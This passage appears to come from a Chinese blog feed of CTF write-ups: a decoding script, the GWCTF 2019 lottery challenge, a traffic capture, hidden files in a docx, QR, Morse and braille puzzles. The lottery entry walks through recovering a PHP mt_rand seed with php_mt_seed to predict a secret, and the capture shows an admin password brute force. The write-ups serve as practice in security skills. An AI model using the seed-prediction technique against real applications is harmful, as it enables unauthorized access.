class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line"></span><br><span class="line">f1 = open(&#x27;C:\\Users\\brighten\\Desktop\\亦真亦假&#x27;,&#x27;r&#x27;)</span><br><span class="line">xor_data = f1.read()</span><br><span class="line">f1.close()</span><br><span class="line">dec_data = &quot;&quot;</span><br><span class="line">for i in xor_data:</span><br><span class="line">    tmp = int(i,16) ^ 5</span><br><span class="line">    dec_data += hex(tmp)[2:]</span><br><span class="line"></span><br><span class="line">print(dec_data)</span><br><span class="line">f2 = open(&#x27;./data.dox&#x27;,&#x27;wb&#x27;)</span><br><span class="line">f2.write(base64.b16decode(dec_data.upper()))</span><br><span class="line">f2.close()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210403095545482.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"><br> 哈哈哈哈，要不是我设置了护眼模式还真的被骗过去了。太坏了。</p><p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210403094941164.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"><br> 做出来的结果如图。</p><hr><hr><h2 id="思考："><a href="#思考：" class="headerlink" title="思考："></a>思考：</h2><p>打开一系列的WPS系列的文件，发现这些全部都是PK头的。<br> 那么这些全部都是zip文件呀。好神奇呀。<br> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210403100407905.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"><br> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210403100613482.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 本科生 </tag>
            
            <tag> 竞赛，ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>枯燥的抽奖_php伪随机</title>
      <link href="/2020/05/27/%E5%8E%9F%E5%88%9B--%20%20%5BGWCTF%202019%5D%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96_php%E4%BC%AA%E9%9A%8F%E6%9C%BA/"/>
      <url>/2020/05/27/%E5%8E%9F%E5%88%9B--%20%20%5BGWCTF%202019%5D%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96_php%E4%BC%AA%E9%9A%8F%E6%9C%BA/</url>
      
        <content type="html"><![CDATA[<h1 id="原创"><a href="#原创" class="headerlink" title="原创"></a>原创</h1><p>：  [GWCTF 2019]枯燥的抽奖_php伪随机</p><h1 id="GWCTF-2019-枯燥的抽奖-php伪随机"><a href="#GWCTF-2019-枯燥的抽奖-php伪随机" class="headerlink" title="[GWCTF 2019]枯燥的抽奖_php伪随机"></a>[GWCTF 2019]枯燥的抽奖_php伪随机</h1><h2 id="查看源代码"><a href="#查看源代码" class="headerlink" title="查看源代码"></a>查看源代码</h2><p>一定在这个check.php里面<br> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210330234557400.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">41JMiDCfQc</span><br><span class="line">&amp;lt;?php</span><br><span class="line">#这不是抽奖程序的源代码！不许看！</span><br><span class="line">header(&quot;Content-Type: text/html;charset=utf-8&quot;);</span><br><span class="line">session_start();</span><br><span class="line">if(!isset($_SESSION[&#x27;seed&#x27;]))&#123;</span><br><span class="line">$_SESSION[&#x27;seed&#x27;]=rand(0,999999999);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mt_srand($_SESSION[&#x27;seed&#x27;]);</span><br><span class="line">$str_long1 = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;</span><br><span class="line">$str=&#x27;&#x27;;</span><br><span class="line">$len1=20;</span><br><span class="line">for ( $i = 0; $i &amp;lt; $len1; $i++ )&#123;</span><br><span class="line">    $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);       </span><br><span class="line">&#125;</span><br><span class="line">$str_show = substr($str, 0, 10);</span><br><span class="line">echo &quot;&amp;lt;p id=&#x27;p1&#x27;&amp;gt;&quot;.$str_show.&quot;&amp;lt;/p&amp;gt;&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(isset($_POST[&#x27;num&#x27;]))&#123;</span><br><span class="line">    if($_POST[&#x27;num&#x27;]===$str)&#123;x</span><br><span class="line">        echo &quot;&amp;lt;p id=flag&amp;gt;抽奖，就是那么枯燥且无味，给你flag&#123;xxxxxxxxx&#125;&amp;lt;/p&amp;gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        echo &quot;&amp;lt;p id=flag&amp;gt;没抽中哦，再试试吧&amp;lt;/p&amp;gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">show_source(&quot;check.php&quot;); </span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote></blockquote><p>$_SESSION[‘seed’]&#x3D;rand(0,999999999);</p><p>就是产生抽奖数字的代码，但是这个seed是不知道的，虽然拿的是一伪随机。</p><p>重点就是拿到这个seed的准确数字。</p><p><strong>41JMiDCfQc</strong></p><h2 id="一般而言，就是在已知的序列入手或者说是直接暴力破解。"><a href="#一般而言，就是在已知的序列入手或者说是直接暴力破解。" class="headerlink" title="一般而言，就是在已知的序列入手或者说是直接暴力破解。"></a>一般而言，就是在已知的序列入手或者说是直接暴力破解。</h2><p>首先还是尝试爆破吧。<br> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210330235137713.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"><br> 它可能是设置了一个<strong>流量限制</strong>，在尝试几千次的时候就禁止访问了。<br> <strong>报429错误</strong><br> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210330235200445.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"></p><p>还是解密要紧。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">str1 =&#x27;41JMiDCfQc&#x27;  #已知的数据块</span><br><span class="line">str2 = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span><br><span class="line">res =&#x27;&#x27;</span><br><span class="line">length = str(len(str2)-1)</span><br><span class="line">for i in range(len(str1)):</span><br><span class="line">    for j in range(len(str2)):</span><br><span class="line">        if str1[i] ==  str2[j]:</span><br><span class="line">            res += str(j) + &#x27; &#x27; +str(j) + &#x27; &#x27; + &#x27;0&#x27; + &#x27; &#x27; + length + &#x27; &#x27;</span><br><span class="line">            break</span><br><span class="line">print(res)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="用网传代码做一个再编码"><a href="#用网传代码做一个再编码" class="headerlink" title="用网传代码做一个再编码"></a>用网传代码做一个再编码</h2><p>，我也不知道这个代码在做什么。</p><blockquote></blockquote><p>30 30 0 61 27 27 0 61 45 45 0 61 48 48 0 61 8 8 0 61 39 39 0 61 38 38 0 61 5 5 0 61 52 52 0 61 2 2 0 61</p><p>解出来是这个。</p><h2 id="在kali下php-mt-seed文件下使用命令"><a href="#在kali下php-mt-seed文件下使用命令" class="headerlink" title="在kali下php_mt_seed文件下使用命令"></a>在kali下php_mt_seed文件下使用命令</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./php_mt_seed 30 30 0 61 27 27 0 61 45 45 0 61 48 48 0 61 8 8 0 61 39 39 0 61 38 38 0 61 5 5 0 61 52 52 0 61 2 2 0 61 </span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="得到了seed-667993876"><a href="#得到了seed-667993876" class="headerlink" title="得到了seed 667993876"></a>得到了seed 667993876</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&amp;lt;?php</span><br><span class="line">mt_srand(667993876);</span><br><span class="line">$str_long1 = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;</span><br><span class="line">$str=&#x27;&#x27;;</span><br><span class="line">$len1=20;</span><br><span class="line">for ( $i = 0; $i &amp;lt; $len1; $i++ )&#123;</span><br><span class="line">    $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);       </span><br><span class="line">&#125;</span><br><span class="line">echo $str;</span><br><span class="line">?&amp;gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#根据上文的check.php获得的产生代码解出密码。</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="41JMiDCfQcSuDTdzAxzG"><a href="#41JMiDCfQcSuDTdzAxzG" class="headerlink" title="41JMiDCfQcSuDTdzAxzG"></a>41JMiDCfQcSuDTdzAxzG</h2><p>得到的密码就是这个。也包含了已知的字符串<strong>41JMiDCfQc</strong></p><p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210331000245671.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"><br> <strong>flag{f2e0baad-7048-49f9-897f-95e17cf2e5fa}</strong></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 本科生 </tag>
            
            <tag> 竞赛，ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>followme 1</title>
      <link href="/2020/05/27/%E5%8E%9F%E5%88%9B--%20%20%5BSUCTF2018%5Dfollowme%201/"/>
      <url>/2020/05/27/%E5%8E%9F%E5%88%9B--%20%20%5BSUCTF2018%5Dfollowme%201/</url>
      
        <content type="html"><![CDATA[<h1 id="原创"><a href="#原创" class="headerlink" title="原创"></a>原创</h1><p>：  [SUCTF2018]followme 1</p><h1 id="SUCTF2018-followme-1"><a href="#SUCTF2018-followme-1" class="headerlink" title="[SUCTF2018]followme 1"></a>[SUCTF2018]followme 1</h1><p>拿到一个流量包</p><p>找字符串flag未果，好像就没什么能干的事情了。</p><p>倒不如把http流找出来。<br> 可能还需要熟练一下wireshark 的用法。</p><p>导出HTTP对象,这个就是导出使用http协议的对象。</p><p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/2021050123112693.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"><br> 像是这个包里面大部分是这种东西。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">name=admin&amp;amp;password=123123123&amp;amp;referer=http%3A%2F%2F192.168.128.145%2Fbuild%2Fadmin%2F</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">name=admin&amp;amp;password=123123123&amp;amp;referer=http://192.168.128.145/build/admin/</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">name=admin&amp;amp;password=789456123&amp;amp;referer=http%3A%2F%2F192.168.128.145%2Fbuild%2Fadmin%2F</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">name=admin&amp;amp;password=789456123&amp;amp;referer=http://192.168.128.145/build/admin/</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这个明显就是在爆破password。</p><p>但是没有什么用。</p><p>搜索文件字符串。就搜flag或是题目的关键字<br> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210501231749544.png"></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 本科生 </tag>
            
            <tag> 竞赛，ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>docx</title>
      <link href="/2020/05/27/%E5%8E%9F%E5%88%9B--%20%20%5BUTCTF2020%5Ddocx/"/>
      <url>/2020/05/27/%E5%8E%9F%E5%88%9B--%20%20%5BUTCTF2020%5Ddocx/</url>
      
        <content type="html"><![CDATA[<h1 id="原创"><a href="#原创" class="headerlink" title="原创"></a>原创</h1><p>：  [UTCTF2020]docx</p><h1 id="UTCTF2020-docx"><a href="#UTCTF2020-docx" class="headerlink" title="[UTCTF2020]docx"></a>[UTCTF2020]docx</h1><p>记得上一篇博客说过，这些docx,ppt什么的全部都是压缩包，准确来说是zip压缩包，通过某种手法显示为了我们看到的样子</p><p>但是看到docx这种题目还是会让人想起那个透明字符和隐藏文字给人带来的绝望。最好都要试一试。<br> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210512210731649.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"><br> 这个docx，我觉得鬼才能看出来里面的flag藏在哪里。</p><p>但是把这个docx换成zip形式，里面的所有文件都将会一览无遗。</p><p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210512211019903.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70">可能是把docx先做好再把这张图片塞进去做出来的题干吧。<br> 个人认为这样塞进去的图片不会在docx中显示。<br> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210512211217274.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"><br> misc的题目让人心力交瘁。</p><p>unflag{unz1p_3v3ryth1ng}</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 本科生 </tag>
            
            <tag> 竞赛，ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>神奇的二维码</title>
      <link href="/2020/05/27/%E5%8E%9F%E5%88%9B--%20%20%5BSWPU2019%5D%E7%A5%9E%E5%A5%87%E7%9A%84%E4%BA%8C%E7%BB%B4%E7%A0%81/"/>
      <url>/2020/05/27/%E5%8E%9F%E5%88%9B--%20%20%5BSWPU2019%5D%E7%A5%9E%E5%A5%87%E7%9A%84%E4%BA%8C%E7%BB%B4%E7%A0%81/</url>
      
        <content type="html"><![CDATA[<h1 id="原创"><a href="#原创" class="headerlink" title="原创"></a>原创</h1><p>：  [SWPU2019]神奇的二维码</p><h1 id="SWPU2019-神奇的二维码"><a href="#SWPU2019-神奇的二维码" class="headerlink" title="[SWPU2019]神奇的二维码"></a>[SWPU2019]神奇的二维码</h1><p><img alt="获取题目文件" src="https://img-blog.csdnimg.cn/20210326134201746.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"><br> 先扫码，拿到了一个疑似flag的东西，flag{this_is_not_flag}</p><p>果然是提交不了。<br> 使用binwalk 把隐藏的文件拿出来，拿到4个压缩包。</p><p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210326134357114.png">一个是base64编码。<br> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210326134628457.png"><br> 这个是下一个文件的解压密码。</p><p>还有一个是flag.txt</p><p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210326134728566.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70">可能有点过分了，是多次的base64解码。拿这个网站比较方便一点。</p><blockquote></blockquote><p><a href="https://base64.supfree.net/">https://base64.supfree.net/</a></p><p>解码得到的是：comEON_YOuAreSOSoS0great</p><p>最后一个是音频文件，解压密码是上面得到的这段字符。<br> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210326134944600.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"><br> 这段音频明显就是莫斯码。耳朵灵的可能能够听出来这段编码。</p><p>耳朵不大灵光的就用软件查看音频图。很容易看出来<br> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210326135307381.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"></p><blockquote></blockquote><p>Audacity(查看音频)<br>–&#x2F;—&#x2F;.-.&#x2F;…&#x2F;.&#x2F;…&#x2F;…&#x2F;…-&#x2F;.&#x2F;.-.&#x2F;-.–&#x2F;…-&#x2F;.&#x2F;.-.&#x2F;-.–&#x2F;.&#x2F;.-&#x2F;…&#x2F;-.–</p><p>拿莫斯码转换器转换。</p><blockquote></blockquote><p><a href="http://www.zhongguosou.com/zonghe/moErSiCodeConverter.aspx?d=123">http://www.zhongguosou.com/zonghe/moErSiCodeConverter.aspx?d=123</a></p><p>得到flag。</p><blockquote></blockquote><p>MORSEISVERYVERYEASY</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 本科生 </tag>
            
            <tag> 竞赛，ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>find_me 1</title>
      <link href="/2020/05/27/%E5%8E%9F%E5%88%9B--%20%20%5BWUSTCTF2020%5Dfind_me%201/"/>
      <url>/2020/05/27/%E5%8E%9F%E5%88%9B--%20%20%5BWUSTCTF2020%5Dfind_me%201/</url>
      
        <content type="html"><![CDATA[<h1 id="原创"><a href="#原创" class="headerlink" title="原创"></a>原创</h1><p>：  [WUSTCTF2020]find_me 1</p><h1 id="WUSTCTF2020-find-me-1"><a href="#WUSTCTF2020-find-me-1" class="headerlink" title="[WUSTCTF2020]find_me 1"></a>[WUSTCTF2020]find_me 1</h1><p>这一题很有意思<br> 一直在想这个备注怎么显示不全。<br> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210326235127293.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"></p><p>题目本来的图片是只读格式的，需要把只读的选项取消掉。<br> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210326234817913.png"><br> 如果是只读格式，那么这个备注是现实不全的，而且无法复制。<br> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210326234736564.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"></p><p>这个一眼就可以看出和盲文很像。<br> 盲文的在线地址：</p><blockquote></blockquote><p><a href="https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=mangwen">https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=mangwen</a><br> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210326235036764.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"></p><p>wctf2020{y</p><pre><code>    0</code></pre><p>​<br>​<br>​       0</p><p>​<br>​    0u_f</p><p>​<br>​<br>​<br>​        1</p><p>​<br>​<br>​       1</p><p>​<br>​    1n</p><p>​<br>​<br>​<br>​        d</p><p>​<br>​<br>​       d</p><p>​<br>​    d_M</p><p>​<br>​<br>​<br>​        e</p><p>​<br>​<br>​       e</p><p>​<br>​    ee</p><p>​<br>​<br>​<br>​        e</p><p>​<br>​<br>​       e</p><p>​<br>​    ee$e}</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 本科生 </tag>
            
            <tag> 竞赛，ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>easy misc 1</title>
      <link href="/2020/05/27/%E5%8E%9F%E5%88%9B--%20%20%5B%E5%AE%89%E6%B4%B5%E6%9D%AF%202019%5Deasy%20misc%201/"/>
      <url>/2020/05/27/%E5%8E%9F%E5%88%9B--%20%20%5B%E5%AE%89%E6%B4%B5%E6%9D%AF%202019%5Deasy%20misc%201/</url>
      
        <content type="html"><![CDATA[<h1 id="原创"><a href="#原创" class="headerlink" title="原创"></a>原创</h1><p>：  [安洵杯 2019]easy misc 1</p><h1 id="安洵杯-2019-easy-misc-1"><a href="#安洵杯-2019-easy-misc-1" class="headerlink" title="[安洵杯 2019]easy misc 1"></a>[安洵杯 2019]easy misc 1</h1><p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/2021051314400627.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210513144017369.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"><br> 拿到一个压缩包</p><p>里面有一个加密的压缩包<br> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210513143952474.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"></p><p>这个压缩包里面有一个神秘的 代码，先把数值计算出来吧。反正misc的题目总是这个样子，也不是第一天知道了。</p><p>那么就先计算一个这个数值吧，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import math</span><br><span class="line">x=2524921</span><br><span class="line">y=(math.pow(x,0.5)*85/5+2)/15-1794</span><br><span class="line">print(y)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210513144223950.png"><br> 算出来是7呀</p><blockquote></blockquote><p>FLAG IN ((√2524921X85÷5+2)÷15-1794)+NNULLULL,</p><p>这个东西理解起来铁定是有二义性的呀。</p><blockquote></blockquote><p>7+NNULLULL,<br> 7NNULLULL,<br> 都不对</p><p>发现这个原来是掩膜爆破</p><blockquote></blockquote><p>a &#x3D; dIW<br> b &#x3D; sSD<br> c &#x3D; adE<br> d &#x3D; jVf<br> e &#x3D; QW8<br> f &#x3D; SA&#x3D;<br> g &#x3D; jBt<br> h &#x3D; 5RE<br> i &#x3D; tRQ<br> j &#x3D; SPA<br> k &#x3D; 8DS<br> l &#x3D; XiE<br> m &#x3D; S8S<br> n &#x3D; MkF<br> o &#x3D; T9p<br> p &#x3D; PS5<br> q &#x3D; E&#x2F;S<br> r &#x3D; -sd<br> s &#x3D; SQW<br> t &#x3D; obW<br> u &#x3D; &#x2F;WS<br> v &#x3D; SD9<br> w &#x3D; cw&#x3D;<br> x &#x3D; ASD<br> y &#x3D; FTa<br> z &#x3D; AE7</p><p>这个格式有点熟悉，显示替换密码的形式</p><p>但是现在就是知道这些 也没有用，因为这也不可能把这个一篇哈利波特全部給替换掉的吧。<br> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210513144837651.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70">知道替换密码的形式，也知道了密文是哈利波特与魔法石？？。</p><p>那么这张图片可能有别的 用处了。<br> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210513145003674.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"><br> 图片png 分析，什么pngcheck,stegsolve的来一波。</p><p>没什么用</p><p>用binwalk 测试</p><p>没有分离出来有用 的信息</p><blockquote></blockquote><p>有一件事情想不通，就是在winhex中搜索IDATx，x后面并没有789C.<br>这个应该是ZLIB的标识才是。<br>那么岂不是有问题。</p><p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210513145922405.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"><br> 使用foremost命令分离，发现输出了两张图片。</p><p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210513150313983.png"><br> 亦或？还是直接stegsolve?</p><h2 id="盲水印"><a href="#盲水印" class="headerlink" title="盲水印"></a>盲水印</h2><p>不是很懂这个东西</p><p>所以说图像这个二维的信息还是很复杂的。<br> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210513152149489.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"><br> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210513152210377.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"><br> 虽然是知道它隐写的行为，但是分不清隐写的类型。<br> 而且一般情况下，在互联网环境下，藏在一系列的图像中，我们甚至是不知道隐写的行为。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 